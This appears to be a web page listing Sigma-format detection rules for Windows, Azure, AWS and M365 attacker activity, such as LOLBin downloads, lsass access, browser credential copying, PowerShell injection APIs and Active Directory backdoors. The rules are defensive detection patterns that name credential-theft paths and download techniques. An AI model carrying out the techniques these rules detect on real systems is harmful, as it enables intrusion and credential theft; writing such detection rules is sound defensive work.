<html>
<title>Detection Rules</title>
<meta name="robots" content="noindex,nofollow" />
<link rel="stylesheet" href="w2.css">

<head>
<style>
html, body {
background-color: #f0f0f0;
}

.w3-topbar {
width: 100%;
height:5%;
background-color: black;
position: fixed;
top: 1px;
overflow: hidden;
}
#myInput {
background-repeat: no-repeat;
width: 40%;
border: 1px solid #ddd;
margin-left: 300px;
text-align: center;
font-family: "Roboto", sans-serif
}
#keywords {
background-repeat: no-repeat;
width: 28%;
border: 1px solid #ddd;
border: 1px solid #ddd;
margin-bottom: 2px;
margin-left: 300px;
text-align: center;
font-family: "Roboto", sans-serif
}
#myUL {
list-style-type: none;
padding: 0;
text-align: center;
margin-top: 10px;
width: 100%;
}
#myUL li a {
margin-top: -1px;
padding: 8px;
text-decoration: none;
font-size: 14px;
color: black;
display: block
}
}
</style>
</head>
<body>
<!-- Topbar -->
<div class="w3-topbar"></div>
<!-- Sidebar -->
<BR>
<p>
<BR>
<center><H3>OpenSearch Detection Rules</H3></center>
<BR>
<input type="text" id="myInput" onkeyup="myFunction()" placeholder="Filter Paragraph by Keyword" title="Search">
<form method="GET" onsubmit="myHilitor.apply(hilite.value); return false;">
<input type="text" id="keywords" size="20" name="hilite" placeholder="Highlight Multiple Keywords">
<input type="submit" value="Apply">
<input type="button" value="Remove" onclick="myHilitor.remove();">
</span>
</form>
</nav>
<div class="w3-main w3-theme-l5" style="margin-left:100px, margin-right:50px">
<div id="playground">
<center>
<ul id="myUL">
<p>
<p>

<li><a href="#">title:Abusable Invoke-ATHRemoteFXvGPUDisablementCommand id: 38a7625e-b2cb-485d-b83d-aff137d859f4 status: experimental author: frack113 date: 2021/07/13 modified: 2021/10/16 description: RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339). references: - - tags: - attack.defense_evasion - attack.t1218 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabledd detection: selection_cmd: ContextInfo|contains: 'Invoke-ATHRemoteFXvGPUDisablementCommand ' selection_opt: ContextInfo|contains: - '-ModuleName ' - '-ModulePath ' - '-ScriptBlock ' - '-RemoteFXvGPUDisablementFilePath' condition: selection_cmd and selection_opt fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium 
<li><a href="#">title:Abusable Invoke-ATHRemoteFXvGPUDisablementCommand id: a6fc3c46-23b8-4996-9ea2-573f4c4d88c5 related: - id: 38a7625e-b2cb-485d-b83d-aff137d859f4 type: derived status: experimental author: frack113 date: 2021/07/13 modified: 2021/09/07 description: RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339). references: - - tags: - attack.defense_evasion - attack.t1218 logsource: product: windows category: process_creation detection: selection_cmd: CommandLine|contains: 'Invoke-ATHRemoteFXvGPUDisablementCommand ' selection_opt: CommandLine|contains: - '-ModuleName ' - '-ModulePath ' - '-ScriptBlock ' - '-RemoteFXvGPUDisablementFilePath' condition: selection_cmd and selection_opt fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium 
<li><a href="#">title:Abusable Invoke-ATHRemoteFXvGPUDisablementCommand id: f65e22f9-819e-4f96-9c7b-498364ae7a25 related: - id: 38a7625e-b2cb-485d-b83d-aff137d859f4 type: derived status: experimental author: frack113 date: 2021/07/13 modified: 2021/09/07 description: RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339). references: - - tags: - attack.defense_evasion - attack.t1218 logsource: product: windows service: powershell-classic definition: fields have to be extract from event detection: selection_cmd: HostApplication|contains: 'Invoke-ATHRemoteFXvGPUDisablementCommand ' selection_opt: HostApplication|contains: - '-ModuleName ' - '-ModulePath ' - '-ScriptBlock ' - '-RemoteFXvGPUDisablementFilePath' condition: selection_cmd and selection_opt fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium 
<li><a href="#">title:Abuse of Service Permissions to Hide Services in Tools id: a537cfc3-4297-4789-92b5-345bfd845ad0 status: experimental description: Detection of sc.exe utility adding a new service with special permission which hides that service. author: Andreas Hunkeler (@Karneades) references: - - date: 2021/12/20 modified: 2022/05/13 logsource: category: process_creation product: windows detection: sc: - Image|endswith: '\sc.exe' - OriginalFileName: 'sc.exe' cli: CommandLine|contains|all: - 'sdset' - 'DCLCWPDTSD' condition: sc and cli falsepositives: - Intended use of hidden services level: high tags: - attack.persistence - attack.defense_evasion - attack.privilege_escalation - attack.t1574.011 
<li><a href="#">title:Abused Debug Privilege by Arbitrary Parent Processes id: d522eca2-2973-4391-a3e0-ef0374321dae status: test description: Detection of unusual child processes by different system processes author: 'Semanur Guneysu @semanurtg, oscd.community' references: - date: 2020/10/28 modified: 2022/06/28 logsource: product: windows category: process_creation detection: selection: ParentImage|endswith: - '\winlogon.exe' - '\services.exe' - '\lsass.exe' - '\csrss.exe' - '\smss.exe' - '\wininit.exe' - '\spoolsv.exe' - '\searchindexer.exe' Image|endswith: - '\powershell.exe' - '\cmd.exe' User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' filter: CommandLine|contains|all: - ' route ' - ' ADD ' condition: selection and not filter fields: - ParentImage - Image - User - CommandLine falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1548 
<li><a href="#">title:Abusing Azure Browser SSO id: 50f852e6-af22-4c78-9ede-42ef36aa3453 description: Detects abusing Azure Browser SSO by requesting OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser. An attacker can use this to authenticate to Azure AD in a browser as that user. author: Den Iuzvyk references: - date: 2020/07/15 modified: 2022/02/21 logsource: category: image_load product: windows status: test tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1574.002 detection: selection_dll: ImageLoaded|endswith: MicrosoftAccountTokenProvider.dll filter_legit: - Image|endswith: - '\BackgroundTaskHost.exe' - '\devenv.exe' - '\iexplore.exe' - '\MicrosoftEdge.exe' - '\Microsoft\Edge\Application\msedge.exe' - '\AppData\Local\Microsoft\OneDrive\OneDrive.exe' - '\msedgewebview2.exe' - '\OneDrive.exe' - Image|startswith: - 'C:\Program Files (x86)\Microsoft\EdgeWebView\Application\' condition: selection_dll and not filter_legit falsepositives: - Unknown level: high 
<li><a href="#">title:Abusing Findstr for Defense Evasion id: bf6c39fc-e203-45b9-9538-05397c1b4f3f status: test description: Attackers can use findstr to hide their artifacts or search specific strings and evade defense mechanism author: 'Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative, Nasreddine Bencherchali' references: - - - date: 2020/10/05 modified: 2022/06/20 logsource: category: process_creation product: windows detection: selection_findstr: - CommandLine|contains: findstr - Image|endswith: 'findstr.exe' - OriginalFileName: 'FINDSTR.EXE' selection_cli_download_1: CommandLine|contains: - /v - -v selection_cli_download_2: CommandLine|contains: - /l - -l selection_cli_creds_1: CommandLine|contains: - /s - -s selection_cli_creds_2: CommandLine|contains: - /i - -i condition: selection_findstr and (all of selection_cli_download* or all of selection_cli_creds*) falsepositives: - Administrative findstr usage level: medium tags: - attack.defense_evasion - attack.t1218 - attack.t1564.004 - attack.t1552.001 - attack.t1105 
<li><a href="#">title:Abusing IEExec To Download Payloads id: 9801abb8-e297-4dbf-9fbd-57dde0e830ad status: experimental description: Detects execution of the IEExec utility to download payloads references: - author: Nasreddine Bencherchali date: 2022/05/16 logsource: category: process_creation product: windows detection: lolbas: - Image|endswith: '\IEExec.exe' - OriginalFileName: 'IEExec.exe' remote: CommandLine|contains: - 'https://' - 'http://' condition: lolbas and remote falsepositives: - Unknown level: high 
<li><a href="#">title:Abusing Permissions Using Dsacls id: 01c42d3c-242d-4655-85b2-34f1739632f7 status: experimental description: Detects usage of Dsacls to grant over permissive permissions author: Nasreddine Bencherchali references: - - (v=ws.11) date: 2022/06/20 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\dsacls.exe' - OriginalFileName: "DSACLS.EXE" selection_flag: CommandLine|contains: ' /G ' selection_permissions: CommandLine|contains: # Add more permissions as you see fit in yout env - 'GR' - 'GE' - 'GW' - 'GA' - 'WP' - 'WD' condition: all of selection* falsepositives: - Legitimate administrators granting over permissive permissions to users level: medium tags: - attack.execution - attack.t1218 
<li><a href="#">title:Abusing Print Executable id: bafac3d6-7de9-4dd9-8874-4a1194b493ed status: test description: Attackers can use print.exe for remote file copy author: 'Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative' references: - - date: 2020/10/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \print.exe CommandLine|startswith: print selection2: CommandLine|contains: /D exeCondition: CommandLine|contains: .exe cmdExclude: CommandLine|contains: print.exe condition: selection1 and selection2 and exeCondition and not cmdExclude falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:Abusing Windows Telemetry For Persistence id: 4e8d5fd3-c959-441f-a941-f73d0cdcdca5 status: experimental description: Windows telemetry makes use of the binary CompatTelRunner.exe to run a variety of commands and perform the actual telemetry collections. This binary was created to be easily extensible, and to that end, it relies on the registry to instruct on which commands to run. The problem is, it will run any arbitrary command without restriction of location or type. references: - author: Sreeman date: 2020/09/29 modified: 2022/03/26 fields: - EventID - CommandLine - TargetObject - Details logsource: product: windows category: registry_set detection: selection: EventType: SetValue TargetObject|contains: 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\' Details|endswith: - .sh - .exe - .dll - .bin - .bat - .cmd - .js - .ps - .vb - .jar - .hta - .msi - .vbs condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.persistence - attack.t1112 - attack.t1053 
<li><a href="#">title:Abusing Windows Telemetry For Persistence id: f548a603-c9f2-4c89-b511-b089f7e94549 status: experimental description: Windows telemetry makes use of the binary CompatTelRunner.exe to run a variety of commands and perform the actual telemetry collections. This binary was created to be easily extensible, and to that end, it relies on the registry to instruct on which commands to run. The problem is, it will run any arbitrary command without restriction of location or type. references: - tags: - attack.defense_evasion - attack.persistence - attack.t1112 - attack.t1053 author: Sreeman date: 2020/09/29 modified: 2022/02/21 fields: - EventID - CommandLine - TargetObject - Details logsource: product: windows category: process_creation detection: selection: CommandLine|contains|all: - 'schtasks' - '\Application Experience\Microsoft Compatibility Appraiser' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Access to ADMIN$ Share id: 098d7118-55bc-4912-a836-dc6483a8d150 status: test description: Detects access to $ADMIN share author: Florian Roth date: 2017/03/04 modified: 2021/11/27 logsource: product: windows service: security definition: 'The advanced audit policy setting "Object Access > Audit File Share" must be configured for Success/Failure' detection: selection: EventID: 5140 ShareName: Admin$ filter: SubjectUserName|endswith: '$' condition: selection and not filter falsepositives: - Legitimate administrative activity level: low tags: - attack.lateral_movement - attack.t1021.002 
<li><a href="#">title:Access to Browser Login Data id: fc028194-969d-4122-8abe-0470d5b8f12f related: - id: 98f4c75c-3089-44f3-b733-b327b9cd9c9d type: obsoletes status: experimental author: frack113 date: 2022/01/30 description: | Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store. references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_cmd: ScriptBlockText|contains|all: - Copy-Item - '-Destination' selection_path: ScriptBlockText|contains: - '\Opera Software\Opera Stable\Login Data' - '\Mozilla\Firefox\Profiles' - '\Microsoft\Edge\User Data\Default' - '\Google\Chrome\User Data\Default\Login Data' - '\Google\Chrome\User Data\Default\Login Data For Account' condition: all of selection_* falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1555.003 
<li><a href="#">title:Accesschk Usage To Check Privileges id: c625d754-6a3d-4f65-9c9a-536aea960d37 status: test description: Accesschk is an access and privilege audit tool developed by SysInternal and often being used by attacker to verify privileges author: Teymur Kheirkhabarov (idea), Mangatas Tondang (rule), oscd.community, Nasreddine Bencherchali (modified) references: - - - - date: 2020/10/13 modified: 2022/06/20 logsource: product: windows category: process_creation detection: selection_img: - Product|endswith: 'AccessChk' - Description|contains: 'Reports effective permissions' - Image|endswith: '\accesschk.exe' selection_cli: CommandLine|contains: # These are the most common flags used with this tool. You could add other combinations if needed - 'uwcqv ' - 'kwsu ' - 'qwsu ' - 'uwdqs ' condition: all of selection* fields: - IntegrityLevel - Product - Description - CommandLine falsepositives: - System administrator Usage level: medium tags: - attack.discovery - attack.t1069.001 
<li><a href="#">title:Accessing WinAPI in PowerShell for Credentials Dumping id: 3f07b9d1-2082-4c56-9277-613a621983cc description: Detects Accessing to lsass.exe by Powershell status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/06 modified: 2021/05/24 references: - tags: - attack.credential_access - attack.t1003.001 logsource: product: windows service: sysmon detection: selection: EventID: - 8 - 10 SourceImage|endswith: '\powershell.exe' TargetImage|endswith: '\lsass.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Accessing WinAPI in PowerShell id: 03d83090-8cba-44a0-b02f-0b756a050306 status: experimental description: Detecting use WinAPI Functions in PowerShell author: Nikita Nazarov, oscd.community, Tim Shelton date: 2020/10/06 modified: 2022/05/23 references: - tags: - attack.execution - attack.t1059.001 - attack.t1106 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - 'WaitForSingleObject' - 'QueueUserApc' - 'RtlCreateUserThread' - 'OpenProcess' - 'VirtualAlloc' - 'VirtualFree' - 'WriteProcessMemory' - 'CreateUserThread' - 'CloseHandle' - 'GetDelegateForFunctionPointer' - 'CreateThread' - 'memcpy' - 'LoadLibrary' - 'GetModuleHandle' - 'GetProcAddress' - 'VirtualProtect' - 'FreeLibrary' - 'ReadProcessMemory' - 'CreateRemoteThread' - 'AdjustTokenPrivileges' # - 'WriteByte' # FP with .NET System.IO.FileStream - 'WriteInt32' - 'OpenThreadToken' - 'PtrToString' - 'FreeHGlobal' - 'ZeroFreeGlobalAllocUnicode' - 'OpenProcessToken' - 'GetTokenInformation' - 'SetThreadToken' - 'ImpersonateLoggedOnUser' - 'RevertToSelf' - 'GetLogonSessionData' - 'CreateProcessWithToken' - 'DuplicateTokenEx' - 'OpenWindowStation' - 'OpenDesktop' - 'MiniDumpWriteDump' - 'AddSecurityPackage' - 'EnumerateSecurityPackages' - 'GetProcessHandle' - 'DangerousGetHandle' - 'kernel32' - 'Advapi32' - 'msvcrt' - 'ntdll' # - 'user32' # FP with chocolatey - 'secur32' falsepositive1: ScriptBlockText|startswith: '# Copyright 2016 Amazon.com, Inc. or its affiliates.' # aws scripts leverage CreateFile and CloseHandle may filter out these 2 items condition: selection and not 1 of falsepositive* falsepositives: - Carbon PowerShell Module () level: high 
<li><a href="#">title:Accessing WinAPI in PowerShell. Code Injection id: eeb2e3dc-c1f4-40dd-9bd5-149ee465ad50 status: test description: Detecting Code injection with PowerShell in another process author: Nikita Nazarov, oscd.community references: - date: 2020/10/06 modified: 2021/11/27 logsource: product: windows category: create_remote_thread definition: 'Note that you have to configure logging for CreateRemoteThread in Symson config' detection: selection: SourceImage|endswith: '\powershell.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Account Disabled or Blocked for Sign in Attempts id: 4afac85c-224a-4dd7-b1af-8da40e1c60bd description: Detects when an account is disabled or blocked for sign in but tried to log in author: Yochana Henderson, '@Yochana-H' date: 2022/06/17 references: - logsource: product: azure service: signinlogs detection: selection: ResultType: 50057 ResultDescription: Failure condition: selection level: medium falsepositives: - Account disabled or blocked in error - Automation account has been blocked or disabled status: experimental tags: - attack.credential_access - attack.t1110 
<li><a href="#">title:Account Enumeration on AWS id: e9c14b23-47e2-4a8b-8a63-d36618e33d70 status: experimental description: Detects enumeration of accounts configuration via api call to list different instances and services within a short period of time. author: toffeebr33k date: 2020/11/21 modified: 2021/08/09 logsource: product: aws service: cloudtrail detection: selection_eventname: eventName: list* timeframe: 10m condition: selection_eventname fields: - userIdentity.arn falsepositives: - AWS Config or other configuration scanning activities level: low tags: - attack.discovery - attack.t1592 
<li><a href="#">title:Account Lockout id: 2b7d6fc0-71ac-4cf7-8ed1-b5788ee5257a status: experimental author: AlertIQ date: 2021/10/10 description: Identifies user account which has been locked because the user tried to sign in too many times with an incorrect user ID or password. references: - logsource: product: azure service: signinlogs detection: selection: ResultType: 50053 condition: selection level: medium falsepositives: - Unknown tags: - attack.credential_access - attack.t1110 
<li><a href="#">title:Account Tampering - Suspicious Failed Logon Reasons id: 9eb99343-d336-4020-a3cd-67f3819e68ee description: This method uses uncommon error codes on failed logons to determine suspicious activity and tampering with accounts that have been disabled or somehow restricted. status: experimental author: Florian Roth date: 2017/02/19 modified: 2022/06/29 references: - - tags: - attack.persistence - attack.defense_evasion - attack.privilege_escalation - attack.initial_access - attack.t1078 logsource: product: windows service: security detection: selection: EventID: - 4625 - 4776 Status: - '0xC0000072' # User logon to account disabled by administrator - '0xC000006F' # User logon outside authorized hours - '0xC0000070' # User logon from unauthorized workstation - '0xC0000413' # Logon Failure: The machine you are logging onto is protected by an authentication firewall. The specified account is not allowed to authenticate to the machine - '0xC000018C' # The logon request failed because the trust relationship between the primary domain and the trusted domain failed - '0xC000015B' # The user has not been granted the requested logon type (aka logon right) at this machine filter: SubjectUserSid: 'S-1-0-0' condition: selection and not filter falsepositives: - User using a disabled account level: medium 
<li><a href="#">title:Active Directory Kerberos DLL Loaded Via Office Applications id: 7417e29e-c2e7-4cf6-a2e8-767228c64837 status: test description: Detects Kerberos DLL being loaded by an Office Product author: Antonlovesdnb references: - date: 2020/02/19 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - '\winword.exe' - '\powerpnt.exe' - '\excel.exe' - '\outlook.exe' ImageLoaded|endswith: '\kerberos.dll' condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: high tags: - attack.execution - attack.t1204.002 
<li><a href="#">title:Active Directory Parsing DLL Loaded Via Office Applications id: a2a3b925-7bb0-433b-b508-db9003263cc4 status: test description: Detects DSParse DLL being loaded by an Office Product author: Antonlovesdnb references: - date: 2020/02/19 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - '\winword.exe' - '\powerpnt.exe' - '\excel.exe' - '\outlook.exe' ImageLoaded|contains: '\dsparse.dll' condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: high tags: - attack.execution - attack.t1204.002 
<li><a href="#">title:Active Directory Replication from Non Machine Account id: 17d619c1-e020-4347-957e-1d1207455c93 status: test description: Detects potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials. author: Roberto Rodriguez @Cyb3rWard0g references: - date: 2019/07/26 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4662 AccessMask: '0x100' Properties|contains: - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' - '89e95b76-444d-4c62-991a-0facbeda640c' filter: - SubjectUserName|endswith: '$' - SubjectUserName|startswith: 'MSOL_' # condition: selection and not filter fields: - ComputerName - SubjectDomainName - SubjectUserName falsepositives: - Unknown level: critical tags: - attack.credential_access - attack.t1003.006 
<li><a href="#">title:Active Directory User Backdoors id: 300bac00-e041-4ee2-9c36-e262656a6ecc status: test description: Detects scenarios where one can control another users or computers account without having to use their credentials. author: '@neu5ron' references: - - - date: 2017/04/13 modified: 2021/11/27 logsource: product: windows service: security definition: 'Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\Windows Settings\Security Settings\Advanced Audit Policy Configuration\Audit Policies\Account Management\Audit User Account Management, DS Access > Audit Directory Service Changes, Group Policy : Computer Configuration\Windows Settings\Security Settings\Advanced Audit Policy Configuration\Audit Policies\DS Access\Audit Directory Service Changes' detection: selection1: EventID: 4738 filter_null: - AllowedToDelegateTo: '-' - AllowedToDelegateTo: selection_5136_1: EventID: 5136 AttributeLDAPDisplayName: 'msDS-AllowedToDelegateTo' selection_5136_2: EventID: 5136 ObjectClass: 'user' AttributeLDAPDisplayName: 'servicePrincipalName' selection_5136_3: EventID: 5136 AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity' condition: (selection1 and not filter_null) or 1 of selection_5136_* falsepositives: - Unknown level: high tags: - attack.t1098 - attack.persistence 
<li><a href="#">title:Activity from Anonymous IP Addresses id: d8b0a4fe-07a8-41be-bd39-b14afa025d95 status: experimental description: Detects when a Microsoft Cloud App Security reported when users were active from an IP address that has been identified as an anonymous proxy IP address. author: Austin Songer @austinsonger date: 2021/08/23 references: - - logsource: service: threat_management product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: 'Activity from anonymous IP addresses' status: success condition: selection falsepositives: - User using a VPN or Proxy level: medium tags: - attack.command_and_control - attack.t1573 
<li><a href="#">title:Activity from Infrequent Country id: 0f2468a2-5055-4212-a368-7321198ee706 status: experimental description: Detects when a Microsoft Cloud App Security reported when an activity occurs from a location that wasn't recently or never visited by any user in the organization. author: Austin Songer @austinsonger date: 2021/08/23 references: - - logsource: service: threat_management product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: 'Activity from infrequent country' status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1573 
<li><a href="#">title:Activity from Suspicious IP Addresses id: a3501e8e-af9e-43c6-8cd6-9360bdaae498 status: experimental description: Detects when a Microsoft Cloud App Security reported users were active from an IP address identified as risky by Microsoft Threat Intelligence. These IP addresses are involved in malicious activities, such as Botnet C&C, and may indicate compromised account. author: Austin Songer @austinsonger date: 2021/08/23 references: - - logsource: service: threat_detection product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: 'Activity from suspicious IP addresses' status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1573 
<li><a href="#">title:Activity Performed by Terminated User id: 2e669ed8-742e-4fe5-b3c4-5a59b486c2ee status: experimental description: Detects when a Microsoft Cloud App Security reported for users whose account were terminated in Azure AD, but still perform activities in other platforms such as AWS or Salesforce. This is especially relevant for users who use another account to manage resources, since these accounts are often not terminated when a user leaves the company. author: Austin Songer @austinsonger date: 2021/08/23 references: - - logsource: service: threat_management product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: 'Activity performed by terminated user' status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.impact 
<li><a href="#">title:AD Object WriteDAC Access id: 028c7842-4243-41cd-be6f-12f3cf1a26c7 status: test description: Detects WRITE_DAC access to a domain object author: Roberto Rodriguez @Cyb3rWard0g references: - date: 2019/09/12 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4662 ObjectServer: 'DS' AccessMask: '0x40000' ObjectType: - '19195a5b-6da0-11d0-afd3-00c04fd930c9' - 'domainDNS' condition: selection falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.t1222.001 
<li><a href="#">title:AD Privileged Users or Groups Reconnaissance id: 35ba1d85-724d-42a3-889f-2e2362bcaf23 description: Detect priv users or groups recon based on 4661 eventid and known privileged users or groups SIDs references: - tags: - attack.discovery - attack.t1087.002 status: experimental author: Samir Bousseaden date: 2019/04/03 modified: 2021/09/08 logsource: product: windows service: security definition: 'Requirements: enable Object Access SAM on your Domain Controllers' detection: selection: EventID: 4661 ObjectType: - 'SAM_USER' - 'SAM_GROUP' selection_object: - ObjectName|endswith: - '-512' - '-502' - '-500' - '-505' - '-519' - '-520' - '-544' - '-551' - '-555' - ObjectName|contains: 'admin' condition: selection and selection_object falsepositives: - If source account name is not an admin then its super suspicious level: high 
<li><a href="#">title:AD User Enumeration id: ab6bffca-beff-4baa-af11-6733f296d57a description: Detects access to a domain user from a non-machine account status: experimental date: 2020/03/30 modified: 2021/08/09 author: Maxime Thiebaut (@0xThiebaut) references: - - - # For further investigation of the accessed properties tags: - attack.discovery - attack.t1087.002 logsource: product: windows service: security definition: Requires the "Read all properties" permission on the user object to be audited for the "Everyone" principal detection: selection: EventID: 4662 ObjectType|contains: 'bf967aba-0de6-11d0-a285-00aa003049e2' # Using contains as the data commonly is structured as "%{bf967aba-0de6-11d0-a285-00aa003049e2}" # The user class () filter: - SubjectUserName|endswith: '$' # Exclude machine accounts - SubjectUserName|startswith: 'MSOL_' # condition: selection and not filter falsepositives: - Administrators configuring new users. level: medium 
<li><a href="#">title:ADCS Certificate Template Configuration Vulnerability id: 5ee3a654-372f-11ec-8d3d-0242ac130003 status: experimental description: Detects certificate creation with template allowing risk permission subject references: - author: Orlinum , BlueDefenZer date: 2021/11/17 tags: - attack.privilege_escalation - attack.credential_access logsource: product: windows service: security definition: Certificate services loaded a template would trigger event ID 4898 and certificate Services template was updated would trigger event ID 4899. A risk permission seems to be comming if template contain specific flag. detection: selection1: EventID: 4898 TemplateContent|contains: 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' selection2: EventID: 4899 NewTemplateContent|contains: 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' condition: selection1 or selection2 falsepositives: - Administrator activity - Proxy SSL certificate with subject modification - Smart card enrollement level: low 
<li><a href="#">title:ADCS Certificate Template Configuration Vulnerability with Risky EKU id: bfbd3291-de87-4b7c-88a2-d6a5deb28668 status: experimental description: Detects certificate creation with template allowing risk permission subject and risky EKU references: - author: Orlinum , BlueDefenZer date: 2021/11/17 tags: - attack.privilege_escalation - attack.credential_access logsource: product: windows service: security definition: Certificate services loaded a template would trigger event ID 4898 and certificate Services template was updated would trigger event ID 4899. A risk permission seems to be comming if template contain specific flag with risky EKU. detection: selection10: EventID: 4898 TemplateContent|contains: - '1.3.6.1.5.5.7.3.2' - '1.3.6.1.5.2.3.4' - '1.3.6.1.4.1.311.20.2.2' - '2.5.29.37.0' selection11: TemplateContent|contains: 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' selection20: EventID: 4899 NewTemplateContent|contains: - '1.3.6.1.5.5.7.3.2' - '1.3.6.1.5.2.3.4' - '1.3.6.1.4.1.311.20.2.2' - '2.5.29.37.0' selection21: NewTemplateContent|contains: 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' condition: (selection10 and selection11) or (selection20 and selection21) falsepositives: - Administrator activity - Proxy SSL certificate with subject modification - Smart card enrollement level: high 
<li><a href="#">title:ADCSPwn Hack Tool id: cd8c163e-a19b-402e-bdd5-419ff5859f12 description: Detects command line parameters used by ADCSPwn, a tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service status: test author: Florian Roth references: - date: 2021/07/31 tags: - attack.credential_access - attack.t1557.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - ' --adcs ' - ' --port ' condition: selection falsepositives: - Unlikely level: high 
<li><a href="#">title:Add Port Monitor Persistence in Registry id: 944e8941-f6f6-4ee8-ac05-1c224e923c0e description: | Adversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup. author: frack113 date: 2021/12/30 modified: 2022/03/26 status: experimental references: - logsource: category: registry_set product: windows detection: selection: TargetObject|startswith: 'HKLM\System\CurrentControlSet\Control\Print\Monitors\' Details|endswith: '.dll' EventType: SetValue filter_cutepdf: Image: 'C:\Windows\System32\spoolsv.exe' TargetObject|contains: '\System\CurrentControlSet\Control\Print\Monitors\CutePDF Writer Monitor v4.0\Driver' Details: 'cpwmon64_v40.dll' User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' condition: selection and not 1 of filter_* falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.010 
<li><a href="#">title:Added Credentials to Existing Application id: cbb67ecc-fb70-4467-9350-c910bdf7c628 description: Detects when a new credential is added to an existing applcation. Any additional credentials added outside of expected processes could be a malicious actor using those credentials. author: Mark Morowczynski '@markmorow', Bailey Bercik '@baileybercik' date: 2022/05/26 references: - logsource: product: azure service: auditlogs detection: selection: properties.message: - Update Application-Certificates and secrets management - Update Service principal/Update Application condition: selection falsepositives: - When credentials are added/removed as part of the normal working hours/workflows level: high status: experimental tags: - attack.t1098 - attack.persistence 
<li><a href="#">title:Added Owner To Application id: 74298991-9fc4-460e-a92e-511aa60baec1 description: Detects when a new owner is added to an application. This gives that account privileges to make modifications and configuration changes to the application. author: Mark Morowczynski '@markmorow', Bailey Bercik '@baileybercik' date: 2022/06/02 references: - logsource: product: azure service: auditlogs detection: selection: properties.message: Add owner to application condition: selection falsepositives: - When a new application owner is added by an administrator level: medium status: experimental tags: - attack.t1528 - attack.persistence - attack.credential_access - attack.defense_evasion 
<li><a href="#">title:Added Rule in Windows Firewall with Advanced Security id: cde0a575-7d3d-4a49-9817-b8004a7bf105 status: experimental description: A rule has been modified in the Windows Firewall exception list author: frack113 date: 2022/02/19 modified: 2022/04/07 references: - (v=ws.10) logsource: product: windows service: firewall-as # EventID 49xx and 50xx are not used in the rule, please don't use Windows Server 2008 R2 detection: selection: EventID: 2004 filter_block: Action: 2 filter_installations: - ApplicationPath|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' - ModifyingApplication: 'C:\Windows\System32\oobe\Setup.exe' - ModifyingApplication|startswith: 'C:\Windows\WinSxS\' # TiWorker.exe - ModifyingApplication: - 'C:\Windows\SysWOW64\msiexec.exe' - 'C:\Windows\System32\svchost.exe' - 'C:\Windows\System32\dllhost.exe' - 'C:\Program Files\Windows Defender\MsMpEng.exe' condition: selection and not 1 of filter_* level: medium 
